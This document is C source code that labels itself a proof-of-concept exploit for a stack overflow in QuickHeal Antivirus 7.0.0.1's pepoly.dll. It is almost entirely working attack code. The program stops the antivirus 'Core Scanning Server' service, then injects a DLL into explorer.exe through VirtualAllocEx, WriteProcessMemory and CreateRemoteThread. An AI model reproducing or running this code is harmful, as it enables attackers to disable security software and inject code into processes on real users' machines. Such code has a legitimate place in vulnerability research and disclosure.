#include <windows.h> 
#include <tlhelp32.h> 
#include <shlwapi.h> 
#include <conio.h> 
#include <stdio.h> 
#include <tchar.h>
#include <aclapi.h>
 
#define WIN32_LEAN_AND_MEAN 
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ) 
 
#pragma comment(lib, "advapi32.lib")
 
typedef struct _SERVICE_STATUS_PROCESS {
  DWORD dwServiceType;
  DWORD dwCurrentState;
  DWORD dwControlsAccepted;
  DWORD dwWin32ExitCode;
  DWORD dwServiceSpecificExitCode;
  DWORD dwCheckPoint;
  DWORD dwWaitHint;
  DWORD dwProcessId;
  DWORD dwServiceFlags;
} SERVICE_STATUS_PROCESS, *LPSERVICE_STATUS_PROCESS;
 
VOID __stdcall DoStopSvc(); 
 
SC_HANDLE schSCManager;
SC_HANDLE schService;
 
int main(int argc, char * argv[]) 
{ 
   char buf[MAX_PATH] = {0}; 
   DWORD pID = GetTargetThreadIDFromProcName("explorer.exe"); 
   printf("\n\n");
   printf("\n\nQuickHeal Antivirus (7.0.0.1) pepoly.dll stack overflow vulnerability Proof of Concept Code");
   printf("\n\nAuthor : Arash Allebrahim");
    
 
   GetFullPathName("ShellExecuteExProperties.dll", MAX_PATH, buf, NULL); 
  
   printf("\n"); 
 
   DoStopSvc();   
   if(!Inject(pID, buf)) 
   { 
        printf("\n\nDLL Not Loaded!"); 
    }else{ 
        printf("\n\nDLL Loaded!"); 
        printf("\n\n( + ) It's ok! just click on QuickHeal tab!");
    }    
     
    _getch(); 
   return 0; 
} 
 
VOID __stdcall DoStopSvc()
{
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwStartTime = GetTickCount();
    DWORD dwBytesNeeded;
    DWORD dwTimeout = 30000; 
    DWORD dwWaitTime;
    schSCManager = OpenSCManager( 
        NULL,                   
        NULL,                    
        SC_MANAGER_ALL_ACCESS);  
  
    if (NULL == schSCManager) 
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
 
    schService = OpenService( 
        schSCManager,          
        "Core Scanning Server",            
        SERVICE_STOP | 
        SERVICE_QUERY_STATUS | 
        SERVICE_ENUMERATE_DEPENDENTS);  
  
    if (schService == NULL)
    { 
        printf("OpenService failed (%d)\n", GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }    
 
    if ( !ControlService( 
            schService, 
            SERVICE_CONTROL_STOP, 
            (LPSERVICE_STATUS) &ssp ) )
    {
        printf( "ControlService failed (%d)\n", GetLastError() );       
    }
 
    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}
 
BOOL Inject(DWORD pID, const char * DLL_NAME) 
{ 
   HANDLE Proc; 
   HMODULE hLib; 
   char buf[50] = {0}; 
   LPVOID RemoteString, LoadLibAddy; 
   if(!pID) 
      return FALSE; 
   Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID); 
   if(!Proc) 
   { 
      sprintf(buf, "OpenProcess() failed: %d", GetLastError()); 
      printf(buf); 
      return FALSE; 
   }    
   LoadLibAddy = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");    
   RemoteString = (LPVOID)VirtualAllocEx(Proc, NULL, strlen(DLL_NAME), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);    
   WriteProcessMemory(Proc, (LPVOID)RemoteString, DLL_NAME, strlen(DLL_NAME), NULL);   
   CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, (LPVOID)RemoteString, NULL, NULL); 
   CloseHandle(Proc); 
   return TRUE; 
} 
 
DWORD GetTargetThreadIDFromProcName(const char * ProcName) 
{ 
   PROCESSENTRY32 pe; 
   HANDLE thSnapShot; 
   BOOL retval, ProcFound = FALSE; 
   thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
   if(thSnapShot == INVALID_HANDLE_VALUE) 
   {       
      printf("Error: Unable to create toolhelp snapshot!"); 
      return FALSE; 
   } 
   pe.dwSize = sizeof(PROCESSENTRY32); 
     
   retval = Process32First(thSnapShot, &pe); 
   while(retval) 
   { 
      if(StrStrI(pe.szExeFile, ProcName)) 
      { 
         return pe.th32ProcessID; 
      } 
      retval = Process32Next(thSnapShot, &pe); 
   } 
   return 0; 
}
 

